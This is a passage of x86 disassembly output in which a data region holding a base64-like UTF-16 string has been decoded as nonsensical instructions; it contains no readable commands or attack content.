  40a13d:	00 49 00             	add    %cl,0x0(%ecx)
  40a140:	30 00                	xor    %al,(%eax)
  40a142:	4b                   	dec    %ebx
  40a143:	00 6e 00             	add    %ch,0x0(%esi)
  40a146:	59                   	pop    %ecx
  40a147:	00 6d 00             	add    %ch,0x0(%ebp)
  40a14a:	59                   	pop    %ecx
  40a14b:	00 41 00             	add    %al,0x0(%ecx)
  40a14e:	72 00                	jb     0x40a150
  40a150:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40a154:	6b 00 57             	imul   $0x57,(%eax),%eax
  40a157:	00 6a 00             	add    %ch,0x0(%edx)
  40a15a:	78 00                	js     0x40a15c
  40a15c:	76 00                	jbe    0x40a15e
  40a15e:	39 00                	cmp    %eax,(%eax)
  40a160:	69 00 70 00 66 00    	imul   $0x660070,(%eax),%eax
  40a166:	51                   	push   %ecx
  40a167:	00 46 00             	add    %al,0x0(%esi)
  40a16a:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40a16e:	52                   	push   %edx
  40a16f:	00 68 00             	add    %ch,0x0(%eax)
  40a172:	77 00                	ja     0x40a174
  40a174:	54                   	push   %esp
  40a175:	00 32                	add    %dh,(%edx)
  40a177:	00 47 00             	add    %al,0x0(%edi)
  40a17a:	4e                   	dec    %esi
  40a17b:	00 6c 00 66          	add    %ch,0x66(%eax,%eax,1)
  40a17f:	00 33                	add    %dh,(%ebx)
  40a181:	00 64 00 67          	add    %ah,0x67(%eax,%eax,1)
  40a185:	00 37                	add    %dh,(%edi)
  40a187:	00 36                	add    %dh,(%esi)
  40a189:	00 55 00             	add    %dl,0x0(%ebp)
  40a18c:	6a 00                	push   $0x0
  40a18e:	44                   	inc    %esp
  40a18f:	00 78 00             	add    %bh,0x0(%eax)
  40a192:	33 00                	xor    (%eax),%eax
  40a194:	77 00                	ja     0x40a196
  40a196:	67 00 4b 00          	add    %cl,0x0(%bp,%di)
  40a19a:	2b 00                	sub    (%eax),%eax
  40a19c:	2b 00                	sub    (%eax),%eax
  40a19e:	46                   	inc    %esi
  40a19f:	00 72 00             	add    %dh,0x0(%edx)
  40a1a2:	49                   	dec    %ecx
  40a1a3:	00 6f 00             	add    %ch,0x0(%edi)
  40a1a6:	48                   	dec    %eax
  40a1a7:	00 61 00             	add    %ah,0x0(%ecx)
  40a1aa:	4f                   	dec    %edi
  40a1ab:	00 57 00             	add    %dl,0x0(%edi)
  40a1ae:	4d                   	dec    %ebp
  40a1af:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40a1b3:	00 69 00             	add    %ch,0x0(%ecx)
  40a1b6:	61                   	popa
  40a1b7:	00 43 00             	add    %al,0x0(%ebx)
  40a1ba:	71 00                	jno    0x40a1bc
  40a1bc:	35 00 54 00 31       	xor    $0x31005400,%eax
  40a1c1:	00 68 00             	add    %ch,0x0(%eax)
  40a1c4:	55                   	push   %ebp
  40a1c5:	00 54 00 36          	add    %dl,0x36(%eax,%eax,1)
  40a1c9:	00 42 00             	add    %al,0x0(%edx)
  40a1cc:	34 00                	xor    $0x0,%al
  40a1ce:	75 00                	jne    0x40a1d0
  40a1d0:	6b 00 56             	imul   $0x56,(%eax),%eax
  40a1d3:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a1d6:	2f                   	das
  40a1d7:	00 64 00 5a          	add    %ah,0x5a(%eax,%eax,1)
  40a1db:	00 37                	add    %dh,(%edi)
  40a1dd:	00 6d 00             	add    %ch,0x0(%ebp)
  40a1e0:	73 00                	jae    0x40a1e2
  40a1e2:	47                   	inc    %edi
  40a1e3:	00 37                	add    %dh,(%edi)
  40a1e5:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40a1e9:	00 72 00             	add    %dh,0x0(%edx)
  40a1ec:	4c                   	dec    %esp
  40a1ed:	00 37                	add    %dh,(%edi)
  40a1ef:	00 58 00             	add    %bl,0x0(%eax)
  40a1f2:	43                   	inc    %ebx
  40a1f3:	00 5a 00             	add    %bl,0x0(%edx)
  40a1f6:	59                   	pop    %ecx
  40a1f7:	00 45 00             	add    %al,0x0(%ebp)
  40a1fa:	6b 00 49             	imul   $0x49,(%eax),%eax
  40a1fd:	00 32                	add    %dh,(%edx)
  40a1ff:	00 61 00             	add    %ah,0x0(%ecx)
  40a202:	58                   	pop    %eax
  40a203:	00 38                	add    %bh,(%eax)
  40a205:	00 51 00             	add    %dl,0x0(%ecx)
  40a208:	52                   	push   %edx
  40a209:	00 62 00             	add    %ah,0x0(%edx)
  40a20c:	78 00                	js     0x40a20e
  40a20e:	52                   	push   %edx
  40a20f:	00 6f 00             	add    %ch,0x0(%edi)
  40a212:	71 00                	jno    0x40a214
  40a214:	42                   	inc    %edx
  40a215:	00 4b 00             	add    %cl,0x0(%ebx)
  40a218:	73 00                	jae    0x40a21a
  40a21a:	4b                   	dec    %ebx
  40a21b:	00 70 00             	add    %dh,0x0(%eax)
  40a21e:	69 00 7a 00 73 00    	imul   $0x73007a,(%eax),%eax
  40a224:	4c                   	dec    %esp
  40a225:	00 45 00             	add    %al,0x0(%ebp)
  40a228:	31 00                	xor    %eax,(%eax)
  40a22a:	59                   	pop    %ecx
  40a22b:	00 2b                	add    %ch,(%ebx)
  40a22d:	00 66 00             	add    %ah,0x0(%esi)
  40a230:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
  40a234:	44                   	inc    %esp
  40a235:	00 33                	add    %dh,(%ebx)
  40a237:	00 75 00             	add    %dh,0x0(%ebp)
  40a23a:	6a 00                	push   $0x0
  40a23c:	45                   	inc    %ebp
  40a23d:	00 78 00             	add    %bh,0x0(%eax)
  40a240:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  40a243:	00 69 00             	add    %ch,0x0(%ecx)
  40a246:	77 00                	ja     0x40a248
  40a248:	6e                   	outsb  %ds:(%esi),(%dx)
  40a249:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  40a24d:	00 33                	add    %dh,(%ebx)
  40a24f:	00 6c 00 35          	add    %ch,0x35(%eax,%eax,1)
  40a253:	00 64 00 74          	add    %ah,0x74(%eax,%eax,1)
  40a257:	00 32                	add    %dh,(%edx)
  40a259:	00 62 00             	add    %ah,0x0(%edx)
  40a25c:	57                   	push   %edi
  40a25d:	00 77 00             	add    %dh,0x0(%edi)
  40a260:	42                   	inc    %edx
  40a261:	00 69 00             	add    %ch,0x0(%ecx)
  40a264:	75 00                	jne    0x40a266
  40a266:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
  40a26a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a26b:	00 63 00             	add    %ah,0x0(%ebx)
  40a26e:	4f                   	dec    %edi
  40a26f:	00 69 00             	add    %ch,0x0(%ecx)
  40a272:	31 00                	xor    %eax,(%eax)
  40a274:	63 00                	arpl   %eax,(%eax)
  40a276:	4a                   	dec    %edx
  40a277:	00 44 00 6e          	add    %al,0x6e(%eax,%eax,1)
  40a27b:	00 6c 00 36          	add    %ch,0x36(%eax,%eax,1)
  40a27f:	00 63 00             	add    %ah,0x0(%ebx)
  40a282:	2b 00                	sub    (%eax),%eax
  40a284:	6a 00                	push   $0x0
  40a286:	4a                   	dec    %edx
  40a287:	00 45 00             	add    %al,0x0(%ebp)
  40a28a:	34 00                	xor    $0x0,%al
  40a28c:	4c                   	dec    %esp
  40a28d:	00 49 00             	add    %cl,0x0(%ecx)
  40a290:	6a 00                	push   $0x0
  40a292:	4b                   	dec    %ebx
  40a293:	00 69 00             	add    %ch,0x0(%ecx)
  40a296:	30 00                	xor    %al,(%eax)
  40a298:	63 00                	arpl   %eax,(%eax)
  40a29a:	58                   	pop    %eax
  40a29b:	00 33                	add    %dh,(%ebx)
  40a29d:	00 73 00             	add    %dh,0x0(%ebx)
  40a2a0:	51                   	push   %ecx
  40a2a1:	00 78 00             	add    %bh,0x0(%eax)
  40a2a4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2a5:	00 41 00             	add    %al,0x0(%ecx)
  40a2a8:	55                   	push   %ebp
  40a2a9:	00 63 00             	add    %ah,0x0(%ebx)
  40a2ac:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2ad:	00 32                	add    %dh,(%edx)
  40a2af:	00 36                	add    %dh,(%esi)
  40a2b1:	00 33                	add    %dh,(%ebx)
  40a2b3:	00 4e 00             	add    %cl,0x0(%esi)
  40a2b6:	38 00                	cmp    %al,(%eax)
  40a2b8:	4c                   	dec    %esp
  40a2b9:	00 62 00             	add    %ah,0x0(%edx)
  40a2bc:	4a                   	dec    %edx
  40a2bd:	00 31                	add    %dh,(%ecx)
  40a2bf:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  40a2c3:	00 50 00             	add    %dl,0x0(%eax)
  40a2c6:	55                   	push   %ebp
  40a2c7:	00 6e 00             	add    %ch,0x0(%esi)
  40a2ca:	44                   	inc    %esp
  40a2cb:	00 61 00             	add    %ah,0x0(%ecx)
  40a2ce:	56                   	push   %esi
  40a2cf:	00 4b 00             	add    %cl,0x0(%ebx)
  40a2d2:	6c                   	insb   (%dx),%es:(%edi)
  40a2d3:	00 4b 00             	add    %cl,0x0(%ebx)
  40a2d6:	6a 00                	push   $0x0
  40a2d8:	62 00                	bound  %eax,(%eax)
  40a2da:	4b                   	dec    %ebx
  40a2db:	00 39                	add    %bh,(%ecx)
  40a2dd:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  40a2e1:	00 6f 00             	add    %ch,0x0(%edi)
  40a2e4:	30 00                	xor    %al,(%eax)
  40a2e6:	46                   	inc    %esi
  40a2e7:	00 7a 00             	add    %bh,0x0(%edx)
  40a2ea:	56                   	push   %esi
  40a2eb:	00 76 00             	add    %dh,0x0(%esi)
  40a2ee:	44                   	inc    %esp
  40a2ef:	00 43 00             	add    %al,0x0(%ebx)
  40a2f2:	4d                   	dec    %ebp
  40a2f3:	00 30                	add    %dh,(%eax)
  40a2f5:	00 74 00 4c          	add    %dh,0x4c(%eax,%eax,1)
  40a2f9:	00 30                	add    %dh,(%eax)
  40a2fb:	00 47 00             	add    %al,0x0(%edi)
  40a2fe:	63 00                	arpl   %eax,(%eax)
  40a300:	4d                   	dec    %ebp
  40a301:	00 33                	add    %dh,(%ebx)
  40a303:	00 77 00             	add    %dh,0x0(%edi)
  40a306:	6d                   	insl   (%dx),%es:(%edi)
  40a307:	00 62 00             	add    %ah,0x0(%edx)
  40a30a:	71 00                	jno    0x40a30c
  40a30c:	4a                   	dec    %edx
  40a30d:	00 79 00             	add    %bh,0x0(%ecx)
  40a310:	35 00 36 00 36       	xor    $0x36003600,%eax
  40a315:	00 37                	add    %dh,(%edi)
  40a317:	00 31                	add    %dh,(%ecx)
  40a319:	00 58 00             	add    %bl,0x0(%eax)
  40a31c:	7a 00                	jp     0x40a31e
  40a31e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a31f:	00 59 00             	add    %bl,0x0(%ecx)
  40a322:	79 00                	jns    0x40a324
  40a324:	4f                   	dec    %edi
  40a325:	00 47 00             	add    %al,0x0(%edi)
  40a328:	7a 00                	jp     0x40a32a
  40a32a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a32b:	00 56 00             	add    %dl,0x0(%esi)
  40a32e:	2b 00                	sub    (%eax),%eax
  40a330:	72 00                	jb     0x40a332
  40a332:	6a 00                	push   $0x0
  40a334:	66 00 33             	data16 add %dh,(%ebx)
  40a337:	00 63 00             	add    %ah,0x0(%ebx)
  40a33a:	6b 00 43             	imul   $0x43,(%eax),%eax
  40a33d:	00 77 00             	add    %dh,0x0(%edi)
  40a340:	45                   	inc    %ebp
  40a341:	00 6e 00             	add    %ch,0x0(%esi)
  40a344:	6d                   	insl   (%dx),%es:(%edi)
  40a345:	00 55 00             	add    %dl,0x0(%ebp)
  40a348:	45                   	inc    %ebp
  40a349:	00 37                	add    %dh,(%edi)
  40a34b:	00 57 00             	add    %dl,0x0(%edi)
  40a34e:	42                   	inc    %edx
  40a34f:	00 79 00             	add    %bh,0x0(%ecx)
  40a352:	79 00                	jns    0x40a354
  40a354:	72 00                	jb     0x40a356
  40a356:	78 00                	js     0x40a358
  40a358:	51                   	push   %ecx
  40a359:	00 66 00             	add    %ah,0x0(%esi)
  40a35c:	4f                   	dec    %edi
  40a35d:	00 49 00             	add    %cl,0x0(%ecx)
  40a360:	48                   	dec    %eax
  40a361:	00 4d 00             	add    %cl,0x0(%ebp)
  40a364:	47                   	inc    %edi
  40a365:	00 4e 00             	add    %cl,0x0(%esi)
  40a368:	4c                   	dec    %esp
  40a369:	00 72 00             	add    %dh,0x0(%edx)
  40a36c:	37                   	aaa
  40a36d:	00 53 00             	add    %dl,0x0(%ebx)
  40a370:	4e                   	dec    %esi
  40a371:	00 75 00             	add    %dh,0x0(%ebp)
  40a374:	4f                   	dec    %edi
  40a375:	00 74 00 34          	add    %dh,0x34(%eax,%eax,1)
  40a379:	00 59 00             	add    %bl,0x0(%ecx)
  40a37c:	55                   	push   %ebp
  40a37d:	00 53 00             	add    %dl,0x0(%ebx)
  40a380:	39 00                	cmp    %eax,(%eax)
  40a382:	68 00 47 00 45       	push   $0x45004700
  40a387:	00 45 00             	add    %al,0x0(%ebp)
  40a38a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a38b:	00 48 00             	add    %cl,0x0(%eax)
  40a38e:	42                   	inc    %edx
  40a38f:	00 47 00             	add    %al,0x0(%edi)
  40a392:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40a396:	49                   	dec    %ecx
  40a397:	00 6e 00             	add    %ch,0x0(%esi)
  40a39a:	4a                   	dec    %edx
  40a39b:	00 48 00             	add    %cl,0x0(%eax)
  40a39e:	63 00                	arpl   %eax,(%eax)
  40a3a0:	49                   	dec    %ecx
  40a3a1:	00 62 00             	add    %ah,0x0(%edx)
  40a3a4:	35 00 33 00 70       	xor    $0x70003300,%eax
  40a3a9:	00 4a 00             	add    %cl,0x0(%edx)
  40a3ac:	71 00                	jno    0x40a3ae
  40a3ae:	46                   	inc    %esi
  40a3af:	00 78 00             	add    %bh,0x0(%eax)
  40a3b2:	31 00                	xor    %eax,(%eax)
  40a3b4:	4a                   	dec    %edx
  40a3b5:	00 33                	add    %dh,(%ebx)
  40a3b7:	00 55 00             	add    %dl,0x0(%ebp)
  40a3ba:	4f                   	dec    %edi
  40a3bb:	00 79 00             	add    %bh,0x0(%ecx)
  40a3be:	72 00                	jb     0x40a3c0
  40a3c0:	50                   	push   %eax
  40a3c1:	00 46 00             	add    %al,0x0(%esi)
  40a3c4:	54                   	push   %esp
  40a3c5:	00 5a 00             	add    %bl,0x0(%edx)
  40a3c8:	4b                   	dec    %ebx
  40a3c9:	00 46 00             	add    %al,0x0(%esi)
  40a3cc:	7a 00                	jp     0x40a3ce
  40a3ce:	70 00                	jo     0x40a3d0
  40a3d0:	74 00                	je     0x40a3d2
  40a3d2:	6d                   	insl   (%dx),%es:(%edi)
  40a3d3:	00 6b 00             	add    %ch,0x0(%ebx)
  40a3d6:	45                   	inc    %ebp
  40a3d7:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  40a3db:	00 35 00 4e 00 6e    	add    %dh,0x6e004e00
  40a3e1:	00 54 00 36          	add    %dl,0x36(%eax,%eax,1)
  40a3e5:	00 41 00             	add    %al,0x0(%ecx)
  40a3e8:	37                   	aaa
  40a3e9:	00 43 00             	add    %al,0x0(%ebx)
  40a3ec:	72 00                	jb     0x40a3ee
  40a3ee:	43                   	inc    %ebx
  40a3ef:	00 67 00             	add    %ah,0x0(%edi)
  40a3f2:	4f                   	dec    %edi
  40a3f3:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a3f6:	2b 00                	sub    (%eax),%eax
  40a3f8:	48                   	dec    %eax
  40a3f9:	00 6d 00             	add    %ch,0x0(%ebp)
  40a3fc:	56                   	push   %esi
  40a3fd:	00 63 00             	add    %ah,0x0(%ebx)
  40a400:	45                   	inc    %ebp
  40a401:	00 46 00             	add    %al,0x0(%esi)
  40a404:	6c                   	insb   (%dx),%es:(%edi)
  40a405:	00 48 00             	add    %cl,0x0(%eax)
  40a408:	74 00                	je     0x40a40a
  40a40a:	6c                   	insb   (%dx),%es:(%edi)
  40a40b:	00 67 00             	add    %ah,0x0(%edi)
  40a40e:	41                   	inc    %ecx
  40a40f:	00 7a 00             	add    %bh,0x0(%edx)
  40a412:	37                   	aaa
  40a413:	00 67 00             	add    %ah,0x0(%edi)
  40a416:	49                   	dec    %ecx
  40a417:	00 6e 00             	add    %ch,0x0(%esi)
  40a41a:	70 00                	jo     0x40a41c
  40a41c:	52                   	push   %edx
  40a41d:	00 4b 00             	add    %cl,0x0(%ebx)
  40a420:	54                   	push   %esp
  40a421:	00 39                	add    %bh,(%ecx)
  40a423:	00 52 00             	add    %dl,0x0(%edx)
  40a426:	6d                   	insl   (%dx),%es:(%edi)
  40a427:	00 31                	add    %dh,(%ecx)
  40a429:	00 37                	add    %dh,(%edi)
  40a42b:	00 6f 00             	add    %ch,0x0(%edi)
  40a42e:	38 00                	cmp    %al,(%eax)
  40a430:	6c                   	insb   (%dx),%es:(%edi)
  40a431:	00 61 00             	add    %ah,0x0(%ecx)
  40a434:	7a 00                	jp     0x40a436
  40a436:	50                   	push   %eax
  40a437:	00 55 00             	add    %dl,0x0(%ebp)
  40a43a:	6c                   	insb   (%dx),%es:(%edi)
  40a43b:	00 70 00             	add    %dh,0x0(%eax)
  40a43e:	45                   	inc    %ebp
  40a43f:	00 6c 00 71          	add    %ch,0x71(%eax,%eax,1)
  40a443:	00 6c 00 57          	add    %ch,0x57(%eax,%eax,1)
  40a447:	00 4a 00             	add    %cl,0x0(%edx)
  40a44a:	32 00                	xor    (%eax),%al
  40a44c:	61                   	popa
  40a44d:	00 61 00             	add    %ah,0x0(%ecx)
  40a450:	61                   	popa
  40a451:	00 67 00             	add    %ah,0x0(%edi)
  40a454:	54                   	push   %esp
  40a455:	00 55 00             	add    %dl,0x0(%ebp)
  40a458:	37                   	aaa
  40a459:	00 6e 00             	add    %ch,0x0(%esi)
  40a45c:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40a460:	4b                   	dec    %ebx
  40a461:	00 61 00             	add    %ah,0x0(%ecx)
  40a464:	78 00                	js     0x40a466
  40a466:	4c                   	dec    %esp
  40a467:	00 38                	add    %bh,(%eax)
  40a469:	00 71 00             	add    %dh,0x0(%ecx)
  40a46c:	49                   	dec    %ecx
  40a46d:	00 41 00             	add    %al,0x0(%ecx)
  40a470:	46                   	inc    %esi
  40a471:	00 42 00             	add    %al,0x0(%edx)
  40a474:	51                   	push   %ecx
  40a475:	00 71 00             	add    %dh,0x0(%ecx)
  40a478:	43                   	inc    %ebx
  40a479:	00 43 00             	add    %al,0x0(%ebx)
  40a47c:	67 00 6f 00          	add    %ch,0x0(%bx)
  40a480:	4e                   	dec    %esi
  40a481:	00 55 00             	add    %dl,0x0(%ebp)
  40a484:	36 00 62 00          	add    %ah,%ss:0x0(%edx)
  40a488:	2b 00                	sub    (%eax),%eax
  40a48a:	37                   	aaa
  40a48b:	00 6e 00             	add    %ch,0x0(%esi)
  40a48e:	50                   	push   %eax
  40a48f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a492:	63 00                	arpl   %eax,(%eax)
  40a494:	47                   	inc    %edi
  40a495:	00 78 00             	add    %bh,0x0(%eax)
  40a498:	34 00                	xor    $0x0,%al
  40a49a:	31 00                	xor    %eax,(%eax)
  40a49c:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  40a4a0:	51                   	push   %ecx
  40a4a1:	00 75 00             	add    %dh,0x0(%ebp)
  40a4a4:	7a 00                	jp     0x40a4a6
  40a4a6:	2f                   	das
  40a4a7:	00 36                	add    %dh,(%esi)
  40a4a9:	00 6f 00             	add    %ch,0x0(%edi)
  40a4ac:	44                   	inc    %esp
  40a4ad:	00 52 00             	add    %dl,0x0(%edx)
  40a4b0:	4c                   	dec    %esp
  40a4b1:	00 48 00             	add    %cl,0x0(%eax)
  40a4b4:	48                   	dec    %eax
  40a4b5:	00 6e 00             	add    %ch,0x0(%esi)
  40a4b8:	69 00 32 00 7a 00    	imul   $0x7a0032,(%eax),%eax
  40a4be:	37                   	aaa
  40a4bf:	00 65 00             	add    %ah,0x0(%ebp)
  40a4c2:	56                   	push   %esi
  40a4c3:	00 61 00             	add    %ah,0x0(%ecx)
  40a4c6:	67 00 30             	add    %dh,(%bx,%si)
  40a4c9:	00 42 00             	add    %al,0x0(%edx)
  40a4cc:	42                   	inc    %edx
  40a4cd:	00 47 00             	add    %al,0x0(%edi)
  40a4d0:	51                   	push   %ecx
  40a4d1:	00 37                	add    %dh,(%edi)
  40a4d3:	00 71 00             	add    %dh,0x0(%ecx)
  40a4d6:	4f                   	dec    %edi
  40a4d7:	00 66 00             	add    %ah,0x0(%esi)
  40a4da:	47                   	inc    %edi
  40a4db:	00 46 00             	add    %al,0x0(%esi)
  40a4de:	31 00                	xor    %eax,(%eax)
  40a4e0:	68 00 46 00 50       	push   $0x50004600
  40a4e5:	00 63 00             	add    %ah,0x0(%ebx)
  40a4e8:	65 00 54 00 50       	add    %dl,%gs:0x50(%eax,%eax,1)
  40a4ed:	00 6b 00             	add    %ch,0x0(%ebx)
  40a4f0:	30 00                	xor    %al,(%eax)
  40a4f2:	64 00 44 00 4b       	add    %al,%fs:0x4b(%eax,%eax,1)
  40a4f7:	00 72 00             	add    %dh,0x0(%edx)
  40a4fa:	42                   	inc    %edx
  40a4fb:	00 57 00             	add    %dl,0x0(%edi)
  40a4fe:	61                   	popa
  40a4ff:	00 4a 00             	add    %cl,0x0(%edx)
  40a502:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40a506:	62 00                	bound  %eax,(%eax)
  40a508:	51                   	push   %ecx
  40a509:	00 2b                	add    %ch,(%ebx)
  40a50b:	00 41 00             	add    %al,0x0(%ecx)
  40a50e:	39 00                	cmp    %eax,(%eax)
  40a510:	2f                   	das
  40a511:	00 4b 00             	add    %cl,0x0(%ebx)
  40a514:	50                   	push   %eax
  40a515:	00 62 00             	add    %ah,0x0(%edx)
  40a518:	6a 00                	push   $0x0
  40a51a:	70 00                	jo     0x40a51c
  40a51c:	52                   	push   %edx
  40a51d:	00 6e 00             	add    %ch,0x0(%esi)
  40a520:	73 00                	jae    0x40a522
  40a522:	73 00                	jae    0x40a524
  40a524:	65 00 44 00 5a       	add    %al,%gs:0x5a(%eax,%eax,1)
  40a529:	00 7a 00             	add    %bh,0x0(%edx)
  40a52c:	2b 00                	sub    (%eax),%eax
  40a52e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a52f:	00 58 00             	add    %bl,0x0(%eax)
  40a532:	62 00                	bound  %eax,(%eax)
  40a534:	4d                   	dec    %ebp
  40a535:	00 67 00             	add    %ah,0x0(%edi)
  40a538:	47                   	inc    %edi
  40a539:	00 6c 00 41          	add    %ch,0x41(%eax,%eax,1)
  40a53d:	00 45 00             	add    %al,0x0(%ebp)
  40a540:	73 00                	jae    0x40a542
  40a542:	6b 00 50             	imul   $0x50,(%eax),%eax
  40a545:	00 79 00             	add    %bh,0x0(%ecx)
  40a548:	75 00                	jne    0x40a54a
  40a54a:	6a 00                	push   $0x0
  40a54c:	56                   	push   %esi
  40a54d:	00 36                	add    %dh,(%esi)
  40a54f:	00 70 00             	add    %dh,0x0(%eax)
  40a552:	6e                   	outsb  %ds:(%esi),(%dx)
  40a553:	00 41 00             	add    %al,0x0(%ecx)
  40a556:	47                   	inc    %edi
  40a557:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  40a55b:	00 71 00             	add    %dh,0x0(%ecx)
  40a55e:	2b 00                	sub    (%eax),%eax
  40a560:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  40a564:	38 00                	cmp    %al,(%eax)
  40a566:	67 00 71 00          	add    %dh,0x0(%bx,%di)
  40a56a:	43                   	inc    %ebx
  40a56b:	00 69 00             	add    %ch,0x0(%ecx)
  40a56e:	63 00                	arpl   %eax,(%eax)
  40a570:	4a                   	dec    %edx
  40a571:	00 4a 00             	add    %cl,0x0(%edx)
  40a574:	4f                   	dec    %edi
  40a575:	00 37                	add    %dh,(%edi)
  40a577:	00 51 00             	add    %dl,0x0(%ecx)
  40a57a:	41                   	inc    %ecx
  40a57b:	00 55 00             	add    %dl,0x0(%ebp)
  40a57e:	7a 00                	jp     0x40a580
  40a580:	56                   	push   %esi
  40a581:	00 2b                	add    %ch,(%ebx)
  40a583:	00 66 00             	add    %ah,0x0(%esi)
  40a586:	34 00                	xor    $0x0,%al
  40a588:	4c                   	dec    %esp
  40a589:	00 66 00             	add    %ah,0x0(%esi)
  40a58c:	46                   	inc    %esi
  40a58d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a590:	31 00                	xor    %eax,(%eax)
  40a592:	33 00                	xor    (%eax),%eax
  40a594:	39 00                	cmp    %eax,(%eax)
  40a596:	72 00                	jb     0x40a598
  40a598:	70 00                	jo     0x40a59a
  40a59a:	78 00                	js     0x40a59c
  40a59c:	31 00                	xor    %eax,(%eax)
  40a59e:	4c                   	dec    %esp
  40a59f:	00 57 00             	add    %dl,0x0(%edi)
  40a5a2:	32 00                	xor    (%eax),%al
  40a5a4:	49                   	dec    %ecx
  40a5a5:	00 72 00             	add    %dh,0x0(%edx)
  40a5a8:	78 00                	js     0x40a5aa
  40a5aa:	68 00 64 00 42       	push   $0x42006400
  40a5af:	00 72 00             	add    %dh,0x0(%edx)
  40a5b2:	72 00                	jb     0x40a5b4
  40a5b4:	37                   	aaa
  40a5b5:	00 4c 00 2b          	add    %cl,0x2b(%eax,%eax,1)
  40a5b9:	00 51 00             	add    %dl,0x0(%ecx)
  40a5bc:	5a                   	pop    %edx
  40a5bd:	00 64 00 7a          	add    %ah,0x7a(%eax,%eax,1)
  40a5c1:	00 6d 00             	add    %ch,0x0(%ebp)
  40a5c4:	58                   	pop    %eax
  40a5c5:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  40a5c9:	00 4d 00             	add    %cl,0x0(%ebp)
  40a5cc:	54                   	push   %esp
  40a5cd:	00 2b                	add    %ch,(%ebx)
  40a5cf:	00 64 00 78          	add    %ah,0x78(%eax,%eax,1)
  40a5d3:	00 61 00             	add    %ah,0x0(%ecx)
  40a5d6:	33 00                	xor    (%eax),%eax
  40a5d8:	6c                   	insb   (%dx),%es:(%edi)
  40a5d9:	00 6f 00             	add    %ch,0x0(%edi)
  40a5dc:	71 00                	jno    0x40a5de
  40a5de:	49                   	dec    %ecx
  40a5df:	00 32                	add    %dh,(%edx)
  40a5e1:	00 4f 00             	add    %cl,0x0(%edi)
  40a5e4:	4c                   	dec    %esp
  40a5e5:	00 45 00             	add    %al,0x0(%ebp)
  40a5e8:	59                   	pop    %ecx
  40a5e9:	00 41 00             	add    %al,0x0(%ecx)
  40a5ec:	55                   	push   %ebp
  40a5ed:	00 6a 00             	add    %ch,0x0(%edx)
  40a5f0:	64 00 78 00          	add    %bh,%fs:0x0(%eax)
  40a5f4:	74 00                	je     0x40a5f6
  40a5f6:	7a 00                	jp     0x40a5f8
  40a5f8:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40a5fb:	00 4a 00             	add    %cl,0x0(%edx)
  40a5fe:	4a                   	dec    %edx
  40a5ff:	00 4a 00             	add    %cl,0x0(%edx)
  40a602:	70 00                	jo     0x40a604
  40a604:	2f                   	das
  40a605:	00 47 00             	add    %al,0x0(%edi)
  40a608:	6c                   	insb   (%dx),%es:(%edi)
  40a609:	00 6b 00             	add    %ch,0x0(%ebx)
  40a60c:	72 00                	jb     0x40a60e
  40a60e:	77 00                	ja     0x40a610
  40a610:	72 00                	jb     0x40a612
  40a612:	43                   	inc    %ebx
  40a613:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40a617:	00 2b                	add    %ch,(%ebx)
  40a619:	00 47 00             	add    %al,0x0(%edi)
  40a61c:	59                   	pop    %ecx
  40a61d:	00 69 00             	add    %ch,0x0(%ecx)
  40a620:	43                   	inc    %ebx
  40a621:	00 4b 00             	add    %cl,0x0(%ebx)
  40a624:	51                   	push   %ecx
  40a625:	00 5a 00             	add    %bl,0x0(%edx)
  40a628:	67 00 62 00          	add    %ah,0x0(%bp,%si)
  40a62c:	4a                   	dec    %edx
  40a62d:	00 67 00             	add    %ah,0x0(%edi)
  40a630:	66 00 71 00          	data16 add %dh,0x0(%ecx)
  40a634:	72 00                	jb     0x40a636
  40a636:	33 00                	xor    (%eax),%eax
  40a638:	77 00                	ja     0x40a63a
  40a63a:	49                   	dec    %ecx
  40a63b:	00 6f 00             	add    %ch,0x0(%edi)
  40a63e:	45                   	inc    %ebp
  40a63f:	00 2b                	add    %ch,(%ebx)
  40a641:	00 63 00             	add    %ah,0x0(%ebx)
  40a644:	53                   	push   %ebx
  40a645:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40a649:	00 42 00             	add    %al,0x0(%edx)
  40a64c:	6c                   	insb   (%dx),%es:(%edi)
  40a64d:	00 61 00             	add    %ah,0x0(%ecx)
  40a650:	34 00                	xor    $0x0,%al
  40a652:	63 00                	arpl   %eax,(%eax)
  40a654:	71 00                	jno    0x40a656
  40a656:	61                   	popa
  40a657:	00 45 00             	add    %al,0x0(%ebp)
  40a65a:	68 00 37 00 36       	push   $0x36003700
  40a65f:	00 55 00             	add    %dl,0x0(%ebp)
  40a662:	48                   	dec    %eax
  40a663:	00 62 00             	add    %ah,0x0(%edx)
  40a666:	6c                   	insb   (%dx),%es:(%edi)
  40a667:	00 65 00             	add    %ah,0x0(%ebp)
  40a66a:	59                   	pop    %ecx
  40a66b:	00 4f 00             	add    %cl,0x0(%edi)
  40a66e:	4e                   	dec    %esi
